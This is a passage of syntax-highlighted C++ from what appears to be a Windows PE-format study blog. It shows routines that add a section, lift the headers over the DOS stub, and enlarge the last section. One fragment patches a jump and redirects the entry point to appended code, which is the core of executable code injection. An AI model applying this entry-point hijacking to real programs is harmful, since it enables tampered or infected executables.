(DWORD)pImageBuffer));</span></span><br><span class=\"line\">    <span class=\"comment\">//DWORD e9 = (pOptionHeader-&gt;AddressOfEntryPoint+pOptionHeader-&gt;ImageBase-(pOptionHeader-&gt;ImageBase + 18) + (DWORD)pImageBuffer);</span></span><br><span class=\"line\">\tDWORD e9 = pOptionHeader-&gt;ImageBase + pOptionHeader-&gt;AddressOfEntryPoint - (pOptionHeader-&gt;ImageBase + pSectionHeader[NumOfSec<span class=\"number\">-1</span>].VirtualAddress + pSectionHeader[NumOfSec<span class=\"number\">-1</span>].Misc.VirtualSize + <span class=\"number\">13</span> + <span class=\"number\">5</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%X\\n&quot;</span>,e9);</span><br><span class=\"line\">\t<span class=\"built_in\">memcpy</span>(addPos+<span class=\"number\">14</span>,&amp;e9,<span class=\"built_in\">sizeof</span>(DWORD));</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//修正OEP</span></span><br><span class=\"line\">\t<span class=\"comment\">//pOptionHeader-&gt;AddressOfEntryPoint = (DWORD)addPos - (DWORD)pImageBuffer;</span></span><br><span class=\"line\">\t<span class=\"comment\">//pOptionHeader-&gt;AddressOfEntryPoint = (DWORD)addPos;</span></span><br><span class=\"line\">\tpOptionHeader-&gt;AddressOfEntryPoint = pSectionHeader[NumOfSec<span class=\"number\">-1</span>].VirtualAddress + pSectionHeader[NumOfSec<span class=\"number\">-1</span>].Misc.VirtualSize;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tpSectionHeader[NumOfSec<span class=\"number\">-1</span>].Characteristics = pSectionHeader[NumOfSec<span class=\"number\">-1</span>].Characteristics | pSectionHeader[<span class=\"number\">0</span>].Characteristics;</span><br><span class=\"line\"></span><br><span class=\"line\">\tDWORD size = <span class=\"built_in\">CopyImageBufferToNewBuffer</span>(pImageBuffer, &amp;pNewBuffer);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">bool</span> isSucc = <span class=\"built_in\">MemeryToFile</span>(pNewBuffer, size, lpszOutFile);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (isSucc == <span class=\"literal\">true</span>) cout &lt;&lt; <span class=\"string\">&quot;Success\\n&quot;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> cout &lt;&lt; <span class=\"string\">&quot;woshishabi\\n&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">TestAddSec</span><span class=\"params\">(IN LPSTR lpszFile, IN DWORD AddNumber, OUT LPSTR lpszOutFile)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tLPVOID pFileBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tLPVOID pImageBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tLPVOID pNewBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"comment\">//从filebuffer - imagebuffer</span></span><br><span class=\"line\">\tDWORD fileLen = <span class=\"built_in\">ReadPEFile</span>(lpszFile, &amp;pFileBuffer);</span><br><span class=\"line\">\tDWORD copySizeFromFile = <span class=\"built_in\">CopyFileBufferToImageBuffer</span>(pFileBuffer, &amp;pImageBuffer);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDosHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNTHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_FILE_HEADER pFileHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_OPTIONAL_HEADER pOptionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;</span><br><span class=\"line\">\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pImageBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\">\tpFileHeader = (PIMAGE_FILE_HEADER)(<span class=\"built_in\">sizeof</span>(pNTHeader-&gt;Signature) + (DWORD)pNTHeader);</span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class=\"line\">\tpSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//判断空闲区大小是否足够添加节表</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ((DWORD)pImageBuffer + pOptionHeader-&gt;SizeOfHeaders - pDosHeader-&gt;e_lfanew - IMAGE_SIZEOF_FILE_HEADER - pFileHeader-&gt;SizeOfOptionalHeader - pFileHeader-&gt;NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER &lt; <span class=\"number\">2</span> * IMAGE_SIZEOF_SECTION_HEADER)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; <span class=\"string\">&quot;headers中空闲区不够!!\\n&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(pFileBuffer);</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(pImageBuffer);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//把节表中第一个节复制到节表中最后一个节</span></span><br><span class=\"line\">\t<span class=\"comment\">//计算开始复制的位置和第一个节的位置</span></span><br><span class=\"line\">\tLPVOID SecBegin = (LPVOID)((DWORD)pImageBuffer + pDosHeader-&gt;e_lfanew + IMAGE_SIZEOF_FILE_HEADER + pFileHeader-&gt;SizeOfOptionalHeader + <span class=\"number\">4</span>);</span><br><span class=\"line\">\t<span class=\"comment\">//LPVOID MyBegin = (LPVOID)((DWORD)pImageBuffer + pDosHeader-&gt;e_lfanew + IMAGE_SIZEOF_FILE_HEADER + pFileHeader-&gt;SizeOfOptionalHeader + pFileHeader-&gt;NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER);</span></span><br><span class=\"line\">\tLPVOID MyBegin = (PIMAGE_SECTION_HEADER)((DWORD)pSectionHeader+(pFileHeader-&gt;NumberOfSections)*IMAGE_SIZEOF_SECTION_HEADER);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">memcpy</span>(MyBegin, SecBegin, IMAGE_SIZEOF_SECTION_HEADER);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//在新增节表后面再加IMAGE_SIZEOF_SECTION_HEADER个0</span></span><br><span class=\"line\">\tLPVOID ZeroBegin = (PIMAGE_SECTION_HEADER)MyBegin + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(ZeroBegin, <span class=\"number\">0</span>, <span class=\"number\">40</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">//修改NumberOfSections</span></span><br><span class=\"line\">\tpFileHeader-&gt;NumberOfSections += <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//新增节，NewSize为新增节的大小</span></span><br><span class=\"line\">\t<span class=\"comment\">//LPVOID codeBegin = (LPVOID)((DWORD)pImageBuffer + pSectionHeader[pFileHeader-&gt;NumberOfSections - 1].VirtualAddress + pSectionHeader[pFileHeader-&gt;NumberOfSections - 1].SizeOfRawData);</span></span><br><span class=\"line\">\t<span class=\"comment\">//memset(codeBegin, 1, AddNumber);</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//修改SizeOfImage</span></span><br><span class=\"line\">\tpOptionHeader-&gt;SizeOfImage += ((AddNumber / pOptionHeader-&gt;SectionAlignment) + <span class=\"number\">1</span>)* pOptionHeader-&gt;SectionAlignment;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//修改节表</span></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\tpSectionHeader[pFileHeader-&gt;NumberOfSections - 1].Name[0] = (BYTE)&quot;s&quot;;</span></span><br><span class=\"line\"><span class=\"comment\">\tpSectionHeader[pFileHeader-&gt;NumberOfSections - 1].Name[1] = (BYTE)&quot;b&quot;;</span></span><br><span class=\"line\"><span class=\"comment\">\tpSectionHeader[pFileHeader-&gt;NumberOfSections - 1].Name[2] = (BYTE)&quot;s&quot;;</span></span><br><span class=\"line\"><span class=\"comment\">\tpSectionHeader[pFileHeader-&gt;NumberOfSections - 1].Name[3] = (BYTE)&quot;b&quot;;</span></span><br><span class=\"line\"><span class=\"comment\">\tpSectionHeader[pFileHeader-&gt;NumberOfSections - 1].Name[4] = (BYTE)&quot;s&quot;;</span></span><br><span class=\"line\"><span class=\"comment\">\tpSectionHeader[pFileHeader-&gt;NumberOfSections - 1].Name[5] = (BYTE)&quot;b&quot;;</span></span><br><span class=\"line\"><span class=\"comment\">\tpSectionHeader[pFileHeader-&gt;NumberOfSections - 1].Name[6] = (BYTE)&quot;s&quot;;</span></span><br><span class=\"line\"><span class=\"comment\">\tpSectionHeader[pFileHeader-&gt;NumberOfSections - 1].Name[7] = (BYTE)&quot;b&quot;;</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\tpSectionHeader[pFileHeader-&gt;NumberOfSections - <span class=\"number\">1</span>].Misc.VirtualSize = AddNumber;</span><br><span class=\"line\">\tpSectionHeader[pFileHeader-&gt;NumberOfSections - <span class=\"number\">1</span>].VirtualAddress = pSectionHeader[pFileHeader-&gt;NumberOfSections - <span class=\"number\">2</span>].VirtualAddress + pSectionHeader[pFileHeader-&gt;NumberOfSections - <span class=\"number\">2</span>].SizeOfRawData;</span><br><span class=\"line\">\tDWORD num = (AddNumber / pOptionHeader-&gt;SectionAlignment) + <span class=\"number\">1</span>;</span><br><span class=\"line\">\tpSectionHeader[pFileHeader-&gt;NumberOfSections - <span class=\"number\">1</span>].SizeOfRawData = ((AddNumber/pOptionHeader-&gt;SectionAlignment)+<span class=\"number\">1</span>) * pOptionHeader-&gt;SectionAlignment;</span><br><span class=\"line\">\tpSectionHeader[pFileHeader-&gt;NumberOfSections - <span class=\"number\">1</span>].Characteristics = pSectionHeader[<span class=\"number\">0</span>].Characteristics;</span><br><span class=\"line\">\tpSectionHeader[pFileHeader-&gt;NumberOfSections - <span class=\"number\">1</span>].PointerToRawData =  pSectionHeader[pFileHeader-&gt;NumberOfSections - <span class=\"number\">2</span>].PointerToRawData + pSectionHeader[pFileHeader-&gt;NumberOfSections - <span class=\"number\">2</span>].SizeOfRawData;</span><br><span class=\"line\">\tDWORD size = <span class=\"built_in\">CopyImageBufferToNewBuffer</span>(pImageBuffer, &amp;pNewBuffer);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">bool</span> isSucc = <span class=\"built_in\">MemeryToFile</span>(pNewBuffer, size, lpszOutFile);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (isSucc == <span class=\"literal\">true</span>) cout &lt;&lt; <span class=\"string\">&quot;Success\\n&quot;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> cout &lt;&lt; <span class=\"string\">&quot;woshishabi\\n&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">TestAddSecInDosStub</span><span class=\"params\">(IN LPSTR lpszFile, IN DWORD AddNumber, OUT LPSTR lpszOutFile)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tLPVOID pFileBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tLPVOID pImageBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tLPVOID pNewBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"comment\">//从filebuffer - imagebuffer</span></span><br><span class=\"line\">\tDWORD fileLen = <span class=\"built_in\">ReadPEFile</span>(lpszFile, &amp;pFileBuffer);</span><br><span class=\"line\">\tDWORD copySizeFromFile = <span class=\"built_in\">CopyFileBufferToImageBuffer</span>(pFileBuffer, &amp;pImageBuffer);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDosHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNTHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_FILE_HEADER pFileHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_OPTIONAL_HEADER pOptionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;</span><br><span class=\"line\">\tDWORD elfanew = pDosHeader-&gt;e_lfanew;</span><br><span class=\"line\">\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pImageBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\">\tpFileHeader = (PIMAGE_FILE_HEADER)(<span class=\"built_in\">sizeof</span>(pNTHeader-&gt;Signature) + (DWORD)pNTHeader);</span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class=\"line\">\tpSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class=\"line\">\t<span class=\"comment\">//保留原始属性???</span></span><br><span class=\"line\">\tDWORD NumOfSec = pFileHeader-&gt;NumberOfSections;</span><br><span class=\"line\">\tDWORD virtualsize = pSectionHeader[NumOfSec - <span class=\"number\">1</span>].Misc.VirtualSize;</span><br><span class=\"line\">\tDWORD virtualaddress = pSectionHeader[NumOfSec - <span class=\"number\">1</span>].VirtualAddress;</span><br><span class=\"line\">\tDWORD pointertorawdata = pSectionHeader[NumOfSec - <span class=\"number\">1</span>].PointerToRawData;</span><br><span class=\"line\">\tDWORD sizeofrawdata = pSectionHeader[NumOfSec - <span class=\"number\">1</span>].SizeOfRawData;</span><br><span class=\"line\">\tDWORD sectionalignment = pOptionHeader-&gt;SectionAlignment;</span><br><span class=\"line\">\t<span class=\"comment\">//判断空闲区大小是否足够添加节表</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//if ((DWORD)pImageBuffer + pOptionHeader-&gt;SizeOfHeaders - pDosHeader-&gt;e_lfanew - IMAGE_SIZEOF_FILE_HEADER - pFileHeader-&gt;SizeOfOptionalHeader - pFileHeader-&gt;NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER &lt; 2 * IMAGE_SIZEOF_SECTION_HEADER)</span></span><br><span class=\"line\">\t<span class=\"comment\">//&#123;</span></span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;提升并覆盖dos stub!\\n&quot;</span>;</span><br><span class=\"line\">\tLPVOID dest = (LPVOID)((DWORD)pImageBuffer + <span class=\"number\">0x40</span>);  <span class=\"comment\">//DOS有用数据结束，垃圾数据开始</span></span><br><span class=\"line\">\tLPVOID source = (LPVOID)((DWORD)pImageBuffer + pDosHeader-&gt;e_lfanew); <span class=\"comment\">//NT begin position</span></span><br><span class=\"line\">\tDWORD size = pDosHeader-&gt;e_lfanew - <span class=\"number\">0x40</span>;  <span class=\"comment\">//向上提升的空间</span></span><br><span class=\"line\">\tcout &lt;&lt; size &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">\tDWORD shabi = (<span class=\"number\">4</span> + IMAGE_SIZEOF_FILE_HEADER + pFileHeader-&gt;SizeOfOptionalHeader + pFileHeader-&gt;NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER); <span class=\"comment\">//signature，nt，file，option，节表提升抬升</span></span><br><span class=\"line\">\t<span class=\"built_in\">memcpy</span>(dest, source, shabi);</span><br><span class=\"line\">\t<span class=\"comment\">//LPVOID newone = (LPVOID)((DWORD)pImageBuffer + pDosHeader-&gt;e_lfanew + IMAGE_SIZEOF_FILE_HEADER + pFileHeader-&gt;SizeOfOptionalHeader + pFileHeader-&gt;NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER + 4 - size);</span></span><br><span class=\"line\">\t<span class=\"comment\">//memset(newone,0,size);</span></span><br><span class=\"line\">\t<span class=\"comment\">//&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//更新e-&gt;lfanew</span></span><br><span class=\"line\">\tpDosHeader-&gt;e_lfanew = elfanew - size;</span><br><span class=\"line\">\t<span class=\"comment\">//更新头指针</span></span><br><span class=\"line\">\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pImageBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\">\t<span class=\"comment\">//PE头</span></span><br><span class=\"line\">\tpFileHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + <span class=\"number\">4</span>);\t<span class=\"comment\">//NT头地址 + 4 为 FileHeader 首址</span></span><br><span class=\"line\">\t<span class=\"comment\">//可选PE头\t</span></span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);<span class=\"comment\">//SIZEOF_FILE_HEADER为固定值且不存在于PE文件字段中</span></span><br><span class=\"line\">\t<span class=\"comment\">//首个节表</span></span><br><span class=\"line\">\tpSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//开始新增节</span></span><br><span class=\"line\">\t<span class=\"comment\">//把节表中第一个节复制到节表中最后一个节</span></span><br><span class=\"line\">\t<span class=\"comment\">//计算开始复制的位置和第一个节的位置</span></span><br><span class=\"line\">\tLPVOID SecBegin = (LPVOID)pSectionHeader; <span class=\"comment\">//第一个节的位置</span></span><br><span class=\"line\">\tLPVOID MyBegin =  (LPVOID)((DWORD)SecBegin + pFileHeader-&gt;NumberOfSections * <span class=\"number\">40</span>);<span class=\"comment\">//复制到的目标位置</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//LPVOID SecBegin = (LPVOID)((DWORD)pImageBuffer + pDosHeader-&gt;e_lfanew + 4 + IMAGE_SIZEOF_FILE_HEADER + pFileHeader-&gt;SizeOfOptionalHeader - size); //第一个节的位置</span></span><br><span class=\"line\">\t<span class=\"comment\">//LPVOID MyBegin =  (LPVOID)((DWORD)pImageBuffer + pDosHeader-&gt;e_lfanew + 4 + IMAGE_SIZEOF_FILE_HEADER + pFileHeader-&gt;SizeOfOptionalHeader + pFileHeader-&gt;NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER - size);//复制到的目标位置</span></span><br><span class=\"line\">\t<span class=\"comment\">//LPVOID MyBegin = (LPVOID)(PIMAGE_SECTION_HEADER)((DWORD)pSectionHeader + (pFileHeader-&gt;NumberOfSections)*IMAGE_SIZEOF_SECTION_HEADER - size);  //复制到的目标位置</span></span><br><span class=\"line\">\t<span class=\"comment\">//cout &lt;&lt; pFileHeader-&gt;NumberOfSections &lt;&lt; &quot;\\n&quot;;</span></span><br><span class=\"line\">\t<span class=\"built_in\">memcpy</span>(MyBegin, SecBegin, <span class=\"number\">40</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//在新增节表后面再加IMAGE_SIZEOF_SECTION_HEADER个0</span></span><br><span class=\"line\">\t<span class=\"comment\">//memset((PBYTE)MyBegin + NumOfSec * 40 + IMAGE_SIZEOF_SECTION_HEADER, 0, IMAGE_SIZEOF_SECTION_HEADER);</span></span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>((PBYTE)MyBegin + <span class=\"number\">40</span>, <span class=\"number\">0</span>, <span class=\"number\">40</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//修改NumberOfSections</span></span><br><span class=\"line\">\tpFileHeader-&gt;NumberOfSections += <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> 1</span></span><br><span class=\"line\">\t<span class=\"comment\">//新增节，NewSize为新增节的大小</span></span><br><span class=\"line\">\t<span class=\"comment\">//LPVOID codeBegin = (LPVOID)((DWORD)pImageBuffer + pSectionHeader[pFileHeader-&gt;NumberOfSections-2].VirtualAddress + pSectionHeader[pFileHeader-&gt;NumberOfSections-2].SizeOfRawData);</span></span><br><span class=\"line\">\t<span class=\"comment\">//memset(codeBegin, 0, AddNumber);</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//修改SizeOfImage</span></span><br><span class=\"line\">\tpOptionHeader-&gt;SizeOfImage += ((AddNumber / sectionalignment) + <span class=\"number\">1</span>)* sectionalignment;</span><br><span class=\"line\">\t<span class=\"comment\">//修改节表</span></span><br><span class=\"line\">\tpSectionHeader[pFileHeader-&gt;NumberOfSections - <span class=\"number\">1</span>].Misc.VirtualSize = AddNumber;  <span class=\"comment\">//vitualsize = 新增大小</span></span><br><span class=\"line\">\tpSectionHeader[pFileHeader-&gt;NumberOfSections - <span class=\"number\">1</span>].VirtualAddress = pSectionHeader[pFileHeader-&gt;NumberOfSections - <span class=\"number\">2</span>].VirtualAddress + pSectionHeader[pFileHeader-&gt;NumberOfSections - <span class=\"number\">2</span>].SizeOfRawData;  <span class=\"comment\">//上一个节的VirtualAddress+sizeofrawdata</span></span><br><span class=\"line\">\tDWORD num = (AddNumber / pOptionHeader-&gt;SectionAlignment) + <span class=\"number\">1</span>;</span><br><span class=\"line\">\tpSectionHeader[pFileHeader-&gt;NumberOfSections - <span class=\"number\">1</span>].SizeOfRawData = ((AddNumber / pOptionHeader-&gt;SectionAlignment) + <span class=\"number\">1</span>) * pOptionHeader-&gt;SectionAlignment; <span class=\"comment\">//sizeofrawdata 对齐后</span></span><br><span class=\"line\">\tpSectionHeader[pFileHeader-&gt;NumberOfSections - <span class=\"number\">1</span>].Characteristics = pSectionHeader[<span class=\"number\">0</span>].Characteristics;</span><br><span class=\"line\">\tpSectionHeader[pFileHeader-&gt;NumberOfSections - <span class=\"number\">1</span>].PointerToRawData = pSectionHeader[pFileHeader-&gt;NumberOfSections - <span class=\"number\">2</span>].PointerToRawData + pSectionHeader[pFileHeader-&gt;NumberOfSections - <span class=\"number\">2</span>].SizeOfRawData;</span><br><span class=\"line\">\tDWORD size1 = <span class=\"built_in\">CopyImageBufferToNewBuffer</span>(pImageBuffer, &amp;pNewBuffer);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">bool</span> isSucc = <span class=\"built_in\">MemeryToFile</span>(pNewBuffer, size1, lpszOutFile);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (isSucc == <span class=\"literal\">true</span>) cout &lt;&lt; <span class=\"string\">&quot;Success\\n&quot;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> cout &lt;&lt; <span class=\"string\">&quot;woshishabi\\n&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//valid program</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">TestExpandLastSec</span><span class=\"params\">(IN LPSTR lpszFile, IN DWORD AddNumber, OUT LPSTR lpszOutFile)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tLPVOID pFileBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tLPVOID pImageBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tLPVOID pNewBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"comment\">//从filebuffer - imagebuffer</span></span><br><span class=\"line\">\tDWORD fileLen = <span class=\"built_in\">ReadPEFile</span>(lpszFile, &amp;pFileBuffer);</span><br><span class=\"line\">\tDWORD copySizeFromFile = <span class=\"built_in\">CopyFileBufferToImageBuffer</span>(pFileBuffer, &amp;pImageBuffer);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDosHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNTHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_FILE_HEADER pFileHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_OPTIONAL_HEADER pOptionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;</span><br><span class=\"line\">\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pImageBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\">\tpFileHeader = (PIMAGE_FILE_HEADER)(<span class=\"built_in\">sizeof</span>(pNTHeader-&gt;Signature) + (DWORD)pNTHeader);</span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class=\"line\">\tpSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//开辟大小为SizeOfImage + x的空间</span></span><br><span class=\"line\">\tLPVOID newspace = (LPVOID)<span class=\"built_in\">malloc</span>(pOptionHeader-&gt;SizeOfImage + AddNumber);</span><br><span class=\"line\">\t<span class=\"comment\">//修改最后一个节的属性</span></span><br><span class=\"line\">\t<span class=\"comment\">//virtualsize内存对齐后的值</span></span><br><span class=\"line\">\tDWORD newvirtualsize = (pSectionHeader[pFileHeader-&gt;NumberOfSections<span class=\"number\">-1</span>].Misc.VirtualSize / pOptionHeader-&gt;SectionAlignment +<span class=\"number\">1</span> ) * pOptionHeader-&gt;SectionAlignment;</span><br><span class=\"line\">\t<span class=\"comment\">//max(sizeofrawdat,virtualsize)</span></span><br><span class=\"line\">\tDWORD maxsize = newvirtualsize &gt; pSectionHeader[pFileHeader-&gt;NumberOfSections<span class=\"number\">-1</span>].SizeOfRawData ? newvirtualsize : pSectionHeader[pFileHeader-&gt;NumberOfSections<span class=\"number\">-1</span>].SizeOfRawData;</span><br><span class=\"line\">\tpSectionHeader[pFileHeader-&gt;NumberOfSections<span class=\"number\">-1</span>].SizeOfRawData = (((maxsize + AddNumber)/pOptionHeader-&gt;SectionAlignment)+<span class=\"number\">1</span>) *  pOptionHeader-&gt;SectionAlignment;</span><br><span class=\"line\">\tpSectionHeader[pFileHeader-&gt;NumberOfSections<span class=\"number\">-1</span>].Misc.VirtualSize = maxsize + AddNumber;</span><br><span class=\"line\">\tcout &lt;&lt; pSectionHeader[pFileHeader-&gt;NumberOfSections<span class=\"number\">-1</span>].SizeOfRawData &lt;&lt; <span class=\"string\">&quot; &quot;</span> &lt;&lt; pSectionHeader[pFileHeader-&gt;NumberOfSections<span class=\"number\">-1</span>].Misc.VirtualSize &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//修改sizeofimage</span></span><br><span class=\"line\">\t<span class=\"comment\">//注意修正SizeofImage，错误的sizeofimage会导致非法的win32程序</span></span><br><span class=\"line\">\t<span class=\"comment\">//pOptionHeader-&gt;SizeOfImage = ((pSectionHeader[pFileHeader-&gt;NumberOfSections-1].Misc.VirtualSize + pSectionHeader[pFileHeader-&gt;NumberOfSections-1].VirtualAddress + AddNumber)/pOptionHeader-&gt;SectionAlignment + 1) * pOptionHeader-&gt;SectionAlignment;</span></span><br><span class=\"line\">\tpOptionHeader-&gt;SizeOfImage = \\</span><br><span class=\"line\">\t\t(((pSectionHeader[pFileHeader-&gt;NumberOfSections - <span class=\"number\">1</span>].Misc.VirtualSize + pSectionHeader[pFileHeader-&gt;NumberOfSections - <span class=\"number\">1</span>].VirtualAddress) / pOptionHeader-&gt;SectionAlignment) + <span class=\"number\">1</span>) * pOptionHeader-&gt;SectionAlignment;</span><br><span class=\"line\">\t<span class=\"comment\">//修改character</span></span><br><span class=\"line\">\tpSectionHeader[pFileHeader-&gt;NumberOfSections<span class=\"number\">-1</span>].Characteristics = pSectionHeader[<span class=\"number\">0</span>].Characteristics | pSectionHeader[pFileHeader-&gt;NumberOfSections<span class=\"number\">-1</span>].Characteristics;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tDWORD size1 = <span class=\"built_in\">CopyImageBufferToNewBuffer</span>(pImageBuffer, &amp;pNewBuffer);</span><br><span class=\"line\">\t<span class=\"type\">bool</span> isSucc = <span 